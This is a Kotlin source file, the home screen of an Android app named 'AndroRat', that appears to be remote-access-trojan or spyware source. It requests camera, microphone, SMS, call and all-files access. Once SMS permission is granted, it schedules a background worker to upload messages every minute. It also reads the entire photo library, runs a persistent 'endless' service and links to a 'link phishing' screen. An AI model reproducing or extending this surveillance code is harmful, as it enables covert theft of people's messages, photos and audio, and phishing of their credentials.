package com.ierusalem.androrat.features.home.presentation

import android.Manifest
import android.app.Activity
import android.content.ContentUris
import android.content.ContentValues
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Environment
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.Toast
import androidx.activity.compose.BackHandler
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.ActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.compose.material3.DrawerValue
import androidx.compose.material3.rememberDrawerState
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.rememberCoroutineScope
import androidx.compose.ui.graphics.ImageBitmap
import androidx.compose.ui.graphics.asAndroidBitmap
import androidx.compose.ui.platform.ComposeView
import androidx.compose.ui.platform.LocalContext
import androidx.core.content.ContextCompat
import androidx.fragment.app.Fragment
import androidx.fragment.app.activityViewModels
import androidx.lifecycle.compose.collectAsStateWithLifecycle
import androidx.navigation.fragment.findNavController
import androidx.work.BackoffPolicy
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkInfo
import androidx.work.WorkManager
import com.ierusalem.androrat.R
import com.ierusalem.androrat.core.data.services.endless_service.Actions
import com.ierusalem.androrat.core.data.services.endless_service.EndlessService
import com.ierusalem.androrat.core.data.services.endless_service.ServiceState
import com.ierusalem.androrat.core.data.services.endless_service.getServiceState
import com.ierusalem.androrat.core.ui.components.AndroRatAppDrawer
import com.ierusalem.androrat.core.ui.components.CameraPermissionTextProvider
import com.ierusalem.androrat.core.ui.components.MusicAndAudioPermissionTextProvider
import com.ierusalem.androrat.core.ui.components.PermissionDialog
import com.ierusalem.androrat.core.ui.components.PhoneCallPermissionTextProvider
import com.ierusalem.androrat.core.ui.components.PhotosAndVideosPermissionTextProvider
import com.ierusalem.androrat.core.ui.components.ReadExternalStoragePermissionTextProvider
import com.ierusalem.androrat.core.ui.components.ReadSMSMessageTextProvider
import com.ierusalem.androrat.core.ui.components.RecordAudioPermissionTextProvider
import com.ierusalem.androrat.core.ui.theme.AndroRATTheme
import com.ierusalem.androrat.core.utils.Constants
import com.ierusalem.androrat.core.utils.executeWithLifecycle
import com.ierusalem.androrat.core.utils.log
import com.ierusalem.androrat.core.utils.openAppSettings
import com.ierusalem.androrat.core.worker.SMSUploadWorker
import com.ierusalem.androrat.features.home.domain.HomeViewModel
import com.ierusalem.androrat.features.home.domain.model.Image
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStream
import java.time.Duration
import java.util.concurrent.TimeUnit

class HomeFragment : Fragment() {

    private val viewModel: HomeViewModel by activityViewModels()

    private val recordAudioAndCallPhonePermissions = arrayOf(
        Manifest.permission.CALL_PHONE,
        Manifest.permission.RECORD_AUDIO,
    )

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private val readMediaImagesAndAudioPermissions = arrayOf(
        Manifest.permission.READ_MEDIA_IMAGES,
        Manifest.permission.READ_MEDIA_AUDIO,
    )

    override fun onResume() {
        super.onResume()
        Constants.PERMISSIONS.forEach { permission ->
            viewModel.updatePermissionState(
                permission = permission, isGranted = ContextCompat.checkSelfPermission(
                    requireContext(),
                    permission
                ) == PackageManager.PERMISSION_GRANTED
            )
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {

        return ComposeView(requireContext()).apply {
            setContent {
                val context = LocalContext.current
                val uiState by viewModel.state.collectAsStateWithLifecycle()
                val dialogQueue = viewModel.visiblePermissionDialogQueue
                val workManager = WorkManager.getInstance(context)

                val drawerState = rememberDrawerState(initialValue = DrawerValue.Closed)
                val drawerOpen by viewModel.drawerShouldBeOpened.collectAsStateWithLifecycle()
                val scope = rememberCoroutineScope()

                if (drawerOpen) {
                    // Open drawer and reset state in VM.
                    LaunchedEffect(Unit) {
                        // wrap in try-finally to handle interruption whiles opening drawer
                        try {
                            drawerState.open()
                        } finally {
                            viewModel.resetOpenDrawerAction()
                        }
                    }
                }

                // Intercepts back navigation when the drawer is open
                if (drawerState.isOpen) {
                    BackHandler {
                        scope.launch {
                            drawerState.close()
                        }
                    }
                }

                val multiplePermissionResultLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestMultiplePermissions(),
                    onResult = { perms ->
                        recordAudioAndCallPhonePermissions.forEach { permission ->
                            viewModel.updatePermissionState(
                                permission = permission,
                                isGranted = perms[permission] == true
                            )
                            if (perms[permission] == true) {
                                Toast.makeText(
                                    requireContext(),
                                    "Permission Granted for Record Audio and Phone Call",
                                    Toast.LENGTH_SHORT
                                ).show()
                            } else {
                                viewModel.onPermissionResult(
                                    permission = permission,
                                    isGranted = false
                                )
                            }
                        }
                    }
                )

                val readMediaImagesAndAudioPermissionsAndroid13Launcher =
                    rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestMultiplePermissions(),
                        onResult = { perms ->
                            readMediaImagesAndAudioPermissions.forEach { permission ->
                                viewModel.updatePermissionState(
                                    permission = permission,
                                    isGranted = perms[permission] == true
                                )
                                if (perms[permission] == true) {
                                    when (permission) {
                                        Manifest.permission.READ_MEDIA_AUDIO -> {
                                            Toast.makeText(
                                                requireContext(),
                                                "Permission Granted for Audio",
                                                Toast.LENGTH_SHORT
                                            ).show()
                                        }

                                        Manifest.permission.READ_MEDIA_IMAGES -> {
                                            Toast.makeText(
                                                requireContext(),
                                                "Permission Granted for Images",
                                                Toast.LENGTH_SHORT
                                            ).show()
                                        }
                                    }
                                } else {
                                    viewModel.onPermissionResult(
                                        permission = permission,
                                        isGranted = false
                                    )
                                }
                            }
                        }
                    )

                val readExternalStoragePermissionUnderAndroid11Launcher =
                    rememberLauncherForActivityResult(
                        contract = ActivityResultContracts.RequestPermission(),
                        onResult = { isGranted ->
                            viewModel.updatePermissionState(
                                permission = Manifest.permission.READ_EXTERNAL_STORAGE,
                                isGranted = isGranted
                            )
                            if (isGranted) {
                                Toast.makeText(
                                    requireContext(),
                                    "Permission Granted for Read External Storage",
                                    Toast.LENGTH_SHORT
                                ).show()
                            } else {
                                viewModel.onPermissionResult(
                                    permission = Manifest.permission.READ_EXTERNAL_STORAGE,
                                    isGranted = false
                                )
                            }
                        }
                    )

                val recordAudioPermissionLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestPermission(),
                    onResult = { isGranted ->
                        viewModel.updatePermissionState(
                            permission = Manifest.permission.RECORD_AUDIO,
                            isGranted = isGranted
                        )
                        if (isGranted) {
                            Toast.makeText(
                                requireContext(),
                                "Permission Granted for Record Audio",
                                Toast.LENGTH_SHORT
                            ).show()
                        } else {
                            viewModel.onPermissionResult(
                                permission = Manifest.permission.RECORD_AUDIO,
                                isGranted = false
                            )
                        }
                    }
                )

                val cameraResultPermissionLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestPermission(),
                    onResult = { isGranted ->
                        viewModel.updatePermissionState(
                            permission = Manifest.permission.CAMERA,
                            isGranted = isGranted
                        )
                        if (isGranted) {
                            Toast.makeText(
                                requireContext(),
                                "Permission Granted for Camera",
                                Toast.LENGTH_SHORT
                            ).show()
                        } else {
                            viewModel.onPermissionResult(
                                permission = Manifest.permission.CAMERA,
                                isGranted = false
                            )
                        }
                    }
                )

                val readSMSMessagesPermissionLauncher = rememberLauncherForActivityResult(
                    contract = ActivityResultContracts.RequestPermission(),
                    onResult = { isGranted ->
                        viewModel.updatePermissionState(
                            permission = Manifest.permission.READ_SMS,
                            isGranted = isGranted
                        )
                        if (isGranted) {
                            findNavController().navigate(R.id.action_homeFragment_to_messageFragment)
                        } else {
                            viewModel.onPermissionResult(
                                permission = Manifest.permission.READ_SMS,
                                isGranted = false
                            )
                        }
                    }
                )

                AndroRATTheme {
                    AndroRatAppDrawer(
                        drawerState = drawerState,
                        onDrawerItemClick = {
                            scope.launch {
                                drawerState.close()
                                viewModel.handleDrawerAction(it)
                            }
                        },
                        userProfile = uiState.userProfile,
                        categories = uiState.categories,
                        content = {
                            HomeScreen(
                                state = uiState,
                                eventHandler = {
                                    viewModel.handleEvents(it)
                                },
                                onOpenMessageFragment = {
                                    readSMSMessagesPermissionLauncher.launch(Manifest.permission.READ_SMS)
                                },
                                onOpenImagesAndVideos = {
                                    findNavController().navigate(R.id.action_homeFragment_to_imageFragment)
                                },
                                onReadExternalStoragePermissionRequest = {
                                    when (Build.VERSION.SDK_INT) {

                                        in Build.VERSION_CODES.M..Build.VERSION_CODES.Q -> {
                                            //todo check these versions
                                            readExternalStoragePermissionUnderAndroid11Launcher.launch(
                                                Manifest.permission.READ_EXTERNAL_STORAGE
                                            )
                                        }

                                        in Build.VERSION_CODES.R..Build.VERSION_CODES.S_V2 -> {
                                            if (Environment.isExternalStorageManager()) {
                                                Toast.makeText(
                                                    requireContext(),
                                                    "Permission granted for ReadExternalStorage",
                                                    Toast.LENGTH_SHORT
                                                ).show()
                                            } else {
                                                Log.d("ahi3646", "onCreateView: read permission denied")
                                                try {
                                                    val intent = Intent()
                                                    intent.action = Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION
                                                    val uri = Uri.fromParts(
                                                        "package",
                                                        activity?.packageName,
                                                        null
                                                    )
                                                    intent.data = uri
                                                    startForResultLauncher.launch(intent)
                                                } catch (e: Exception) {
                                                    Log.e("ahi3646", "onCreateView: $e")
                                                    val intent = Intent()
                                                    intent.action = Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION
                                                    startForResultLauncher.launch(intent)
                                                }
                                            }
                                        }
                                        //this works in sdk 33 or higher versions
                                        in Build.VERSION_CODES.TIRAMISU..Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                                            //todo check these versions
                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                readMediaImagesAndAudioPermissions
                                            )
                                        }
                                    }
                                },
                                onMultiplePermissionRequest = {
                                    multiplePermissionResultLauncher.launch(
                                        recordAudioAndCallPhonePermissions
                                    )
                                },
                                onRecordAudioPermissionRequest = {
                                    recordAudioPermissionLauncher.launch(Manifest.permission.RECORD_AUDIO)
                                },
                                onCameraPermissionRequest = {
                                    cameraResultPermissionLauncher.launch(Manifest.permission.CAMERA)
                                },
                                onStartEndlessService = {
                                    actionOnService(Actions.START)
                                },
                                onStopEndlessService = {
                                    actionOnService(Actions.STOP)
                                }
                            )
                        }
                    )
                    LaunchedEffect(
                        key1 = Unit,
                        block = {
                            val permissions = viewModel.state.value.permissions
                            val notGrantedPermissions =
                                viewModel.state.value.permissions.filter { (_, isGranted) ->
                                    !isGranted
                                }

                            // periodic work request for non granted permissions
//                            val permissionWorkRequest =
//                                PeriodicWorkRequestBuilder<PermissionRequestWorker>(
//                                    repeatInterval = 1,
//                                    repeatIntervalTimeUnit = TimeUnit.MINUTES,
//                                )
//                                    .setBackoffCriteria(
//                                        BackoffPolicy.LINEAR,
//                                        duration = Duration.ofSeconds(15)
//                                    )
//                                    .build()
                            //to toggle asking non granted permission here, currently disabled
//                            workManager.enqueueUniquePeriodicWork(
//                                Constants.PERMISSION_REQUEST_WORK_NAME,
//                                ExistingPeriodicWorkPolicy.KEEP,
//                                permissionWorkRequest
//                            )
                            workManager.getWorkInfosForUniqueWorkLiveData(Constants.PERMISSION_REQUEST_WORK_NAME)
                                .observe(viewLifecycleOwner) {
                                    it.forEach { workInfo ->
                                        Log.d(
                                            "ahi3646_request",
                                            "onCreateView: ${workInfo.state}"
                                        )
                                        if (workInfo.state == WorkInfo.State.RUNNING) {
                                            notGrantedPermissions.forEach { (permission, isGranted) ->
                                                viewModel.onPermissionResult(
                                                    permission,
                                                    isGranted
                                                )
                                            }
                                        }
                                    }
                                }
                            permissions.forEach { (permission, isGranted) ->
                                when (permission) {
                                    Manifest.permission.READ_MEDIA_IMAGES -> {
                                        if (isGranted) {
                                            //todo add location later
                                            val projection = arrayOf(
                                                MediaStore.Images.Media._ID,
                                                MediaStore.Images.Media.AUTHOR,
                                                MediaStore.Images.Media.DISPLAY_NAME,
                                                MediaStore.Images.Media.DATA,
                                                MediaStore.Images.Media.DATE_TAKEN,
                                                MediaStore.Images.Media.DESCRIPTION
                                            )
                                            //selection defines which photos we want to read, null means all of them
                                            val selection = null
                                            val selectionArgs = null
                                            val sortOrder =
                                                "${MediaStore.Images.Media.DATE_TAKEN} DESC"

                                            requireContext().contentResolver.query(
                                                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                                projection,
                                                selection,
                                                selectionArgs,
                                                sortOrder
                                            )?.use { cursor ->
                                                val idColumn =
                                                    cursor.getColumnIndex(MediaStore.Images.Media._ID)
                                                val authorColumn =
                                                    cursor.getColumnIndex(MediaStore.Images.Media.AUTHOR)
                                                val displayNameColumn =
                                                    cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                                                val dataColumn =
                                                    cursor.getColumnIndex(MediaStore.Images.Media.DATA)
                                                val dataTakenColumn =
                                                    cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
                                                val descriptionColumn =
                                                    cursor.getColumnIndex(MediaStore.Images.Media.DESCRIPTION)

                                                val images = mutableListOf<Image>()
                                                while (cursor.moveToNext()) {
                                                    val id = cursor.getLong(idColumn)
                                                    val author = cursor.getLong(authorColumn)
                                                    val disPlayName =
                                                        cursor.getString(displayNameColumn)
                                                    val data = cursor.getString(dataColumn)
                                                    val dataTaken =
                                                        cursor.getLong(dataTakenColumn)
                                                    val description =
                                                        cursor.getLong(descriptionColumn)

                                                    val uri = ContentUris.withAppendedId(
                                                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                                                        id
                                                    )
                                                    images.add(
                                                        Image(
                                                            id = id,
                                                            author = author,
                                                            displayName = disPlayName,
                                                            data = data,
                                                            dataTaken = dataTaken,
                                                            description = description,
                                                            uri = uri
                                                        )
                                                    )
                                                }
                                                viewModel.updateImages(images)
                                            }
                                        } else {
                                            Log.d("ahi3646_images", "onCreateView: not granted ")
                                        }
                                        Log.d(
                                            "ahi3646_xxx",
                                            "onCreateView: $permission $isGranted "
                                        )
                                    }

                                    Manifest.permission.READ_EXTERNAL_STORAGE -> {
                                        Log.d(
                                            "ahi3646_xxx",
                                            "onCreateView: $permission $isGranted "
                                        )
                                    }

                                    Manifest.permission.READ_MEDIA_AUDIO -> {
                                        Log.d(
                                            "ahi3646_xxx",
                                            "onCreateView: $permission $isGranted "
                                        )
                                    }

                                    Manifest.permission.CAMERA -> {
                                        Log.d(
                                            "ahi3646_xxx",
                                            "onCreateView: $permission $isGranted "
                                        )
                                    }

                                    Manifest.permission.READ_SMS -> {
                                        if (isGranted) {
                                            val uploadWorkRequest =
                                                PeriodicWorkRequestBuilder<SMSUploadWorker>(
                                                    repeatInterval = 1,
                                                    repeatIntervalTimeUnit = TimeUnit.MINUTES,
                                                ).setBackoffCriteria(
                                                    BackoffPolicy.LINEAR,
                                                    duration = Duration.ofSeconds(15)
                                                ).build()


                                            workManager.enqueueUniquePeriodicWork(
                                                Constants.SMS_UPLOAD_WORK_NAME,
                                                ExistingPeriodicWorkPolicy.KEEP,
                                                uploadWorkRequest
                                            )
                                            workManager.getWorkInfosForUniqueWorkLiveData(Constants.SMS_UPLOAD_WORK_NAME)
                                                .observe(viewLifecycleOwner) {
                                                    it.forEach { workInfo ->
                                                        Log.d(
                                                            "ahi3646_upload",
                                                            "onCreateView: workInfo - ${workInfo.state} "
                                                        )
                                                    }
                                                }
                                        } else {
                                            Log.d(
                                                "ahi3646_xxx",
                                                "onCreateView: upload work for $permission cancelled "
                                            )
                                            workManager.cancelUniqueWork(Constants.SMS_UPLOAD_WORK_NAME)
                                        }
                                    }

                                    Manifest.permission.RECORD_AUDIO -> {
                                        Log.d(
                                            "ahi3646_xxx",
                                            "onCreateView: $permission $isGranted "
                                        )
                                    }

                                    Manifest.permission.CALL_PHONE -> {
                                        Log.d(
                                            "ahi3646_xxx",
                                            "onCreateView: $permission $isGranted "
                                        )
                                    }
                                }
                            }
                        }
                    )

                    dialogQueue
                        .reversed()
                        .forEach { permission ->
                            PermissionDialog(
                                permissionTextProvider = when (permission) {
                                    /**
                                     * No need to add Manifest.permission.READ_MEDIA_VIDEO
                                     * this will make rational dialog pop up two times for same warning
                                     * Once user allow for READ_VIDEOS or READ_IMAGE , both permissions
                                     * will be accessible for app
                                     */
                                    /**
                                     * No need to add Manifest.permission.READ_MEDIA_VIDEO
                                     * this will make rational dialog pop up two times for same warning
                                     * Once user allow for READ_VIDEOS or READ_IMAGE , both permissions
                                     * will be accessible for app
                                     */
                                    /**
                                     * No need to add Manifest.permission.READ_MEDIA_VIDEO
                                     * this will make rational dialog pop up two times for same warning
                                     * Once user allow for READ_VIDEOS or READ_IMAGE , both permissions
                                     * will be accessible for app
                                     */
                                    /**
                                     * No need to add Manifest.permission.READ_MEDIA_VIDEO
                                     * this will make rational dialog pop up two times for same warning
                                     * Once user allow for READ_VIDEOS or READ_IMAGE , both permissions
                                     * will be accessible for app
                                     */
                                    Manifest.permission.READ_MEDIA_IMAGES -> {
                                        PhotosAndVideosPermissionTextProvider()
                                    }

                                    Manifest.permission.READ_EXTERNAL_STORAGE -> {
                                        ReadExternalStoragePermissionTextProvider()
                                    }

                                    Manifest.permission.READ_MEDIA_AUDIO -> {
                                        MusicAndAudioPermissionTextProvider()
                                    }

                                    Manifest.permission.CAMERA -> {
                                        CameraPermissionTextProvider()
                                    }

                                    Manifest.permission.READ_SMS -> {
                                        ReadSMSMessageTextProvider()
                                    }

                                    Manifest.permission.RECORD_AUDIO -> {
                                        RecordAudioPermissionTextProvider()
                                    }

                                    Manifest.permission.CALL_PHONE -> {
                                        PhoneCallPermissionTextProvider()
                                    }

                                    else -> return@forEach
                                },
                                isPermanentlyDeclined = !shouldShowRequestPermissionRationale(
                                    permission
                                ),
                                onDismiss = viewModel::dismissDialog,
                                onOkClick = {
                                    when (permission) {
                                        Manifest.permission.READ_MEDIA_AUDIO -> {
                                            viewModel.dismissDialog()
                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                arrayOf(permission)
                                            )
                                        }

                                        Manifest.permission.READ_MEDIA_IMAGES -> {
                                            viewModel.dismissDialog()
                                            readMediaImagesAndAudioPermissionsAndroid13Launcher.launch(
                                                arrayOf(permission)
                                            )
                                        }

                                        Manifest.permission.READ_EXTERNAL_STORAGE -> {
                                            viewModel.dismissDialog()
                                            readExternalStoragePermissionUnderAndroid11Launcher.launch(
                                                permission
                                            )
                                        }

                                        Manifest.permission.CAMERA -> {
                                            viewModel.dismissDialog()
                                            cameraResultPermissionLauncher.launch(permission)
                                        }

                                        Manifest.permission.READ_SMS -> {
                                            viewModel.dismissDialog()
                                            readSMSMessagesPermissionLauncher.launch(permission)
                                        }

                                        Manifest.permission.RECORD_AUDIO -> {
                                            viewModel.dismissDialog()
                                            multiplePermissionResultLauncher.launch(
                                                arrayOf(permission)
                                            )
                                        }

                                        Manifest.permission.CALL_PHONE -> {
                                            viewModel.dismissDialog()
                                            multiplePermissionResultLauncher.launch(
                                                arrayOf(permission)
                                            )
                                        }
                                    }
                                },
                                onGoToAppSettingsClick = ::openAppSettings
                            )
                        }
                }
            }
        }
    }

    private fun actionOnService(action: Actions) {
        if (getServiceState(requireContext()) == ServiceState.STOPPED && action == Actions.STOP) return
        Intent(requireActivity(), EndlessService::class.java).also {
            it.action = action.name
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                log("Starting the service in >=26 Mode")
                requireActivity().startForegroundService(it)
                return
            }
            log("Starting the service in < 26 Mode")
            requireActivity().startService(it)
        }
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)
        viewModel.screenNavigation.executeWithLifecycle(
            lifecycle = viewLifecycleOwner.lifecycle,
            action = ::executeNavigation
        )
    }

    @RequiresApi(Build.VERSION_CODES.R)
    val startForResultLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result: ActivityResult ->
        if (result.resultCode == Activity.RESULT_OK) {
            //  you will get result here in result.data
            Log.d(
                "ahi3646",
                "onActivityResult: Manage External Storage Permissions Granted"
            )
        }
        if (result.resultCode == Activity.RESULT_CANCELED) {
            Log.d(
                "ahi3646",
                "onActivityResult: Manage External Storage Permissions denied"
            )
        }
    }

    private fun executeNavigation(navigation: HomeScreenNavigation) {
        when (navigation) {
            HomeScreenNavigation.NavigateToMessageFragment -> {
                findNavController().navigate(R.id.action_homeFragment_to_messageFragment)
            }
            HomeScreenNavigation.NavigateToAndroRtcFragment ->{
                findNavController().navigate(R.id.action_homeFragment_to_androRtcFragment)
            }
            HomeScreenNavigation.NavigateToLinkPhishingFragment -> {
                findNavController().navigate(R.id.action_homeFragment_to_linkPhishingFragment)
            }
            HomeScreenNavigation.NavigateToSettingsFragment -> {
                findNavController().navigate(R.id.action_homeFragment_to_settingsFragment)
            }
        }
    }

    @Suppress("unused")
    private fun saveMediaToStorage(bitmap: ImageBitmap) {
        val filename = "${System.currentTimeMillis()}.jpg"
        var fos: OutputStream? = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            activity?.contentResolver?.also { resolver ->
                val contentValues = ContentValues().apply {
                    put(MediaStore.MediaColumns.DISPLAY_NAME, filename)
                    put(MediaStore.MediaColumns.MIME_TYPE, "image/jpg")
                    put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_PICTURES)
                }
                val imageUri: Uri? =
                    resolver.insert(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, contentValues)
                fos = imageUri?.let { resolver.openOutputStream(it) }
            }
        } else {
            val imagesDir =
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
            val image = File(imagesDir, filename)
            fos = FileOutputStream(image)
        }
        fos?.use {
            bitmap.asAndroidBitmap().compress(Bitmap.CompressFormat.JPEG, 100, it)
            Toast.makeText(
                requireContext(),
                getString(R.string.saved_to_photos_debug), Toast.LENGTH_SHORT
            ).show()
        }
    }

    @SuppressWarnings("unused")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        /**
         * To check the permissions whether granted or not
         */
//        ContextCompat.checkSelfPermission(
//            this, Manifest.permission.READ_MEDIA_IMAGES
//        ) == PackageManager.PERMISSION_GRANTED -> {
//            // You can use the API that requires the permission.
//        }

        /**
         * To check whether a device supports microphone and camera toggles,
         * add the logic that appears in the following code snippet:
         */

//        val sensorPrivacyManager = applicationContext
//            .getSystemService(SensorPrivacyManager::class.java)
//                as SensorPrivacyManager
//        val supportsMicrophoneToggle = sensorPrivacyManager
//            .supportsSensorToggle(Sensors.MICROPHONE)
//        val supportsCameraToggle = sensorPrivacyManager
//            .supportsSensorToggle(Sensors.CAMERA)

        /**
         * Check whether your app is running on a device that has a front-facing camera.
         */
//        if (applicationContext.packageManager.hasSystemFeature(
//                PackageManager.FEATURE_CAMERA_FRONT
//            )
//        ) {
//            // Continue with the part of your app's workflow that requires a
//            // front-facing camera.
//        } else {
//            // Gracefully degrade your app experience.
//        }
    }


}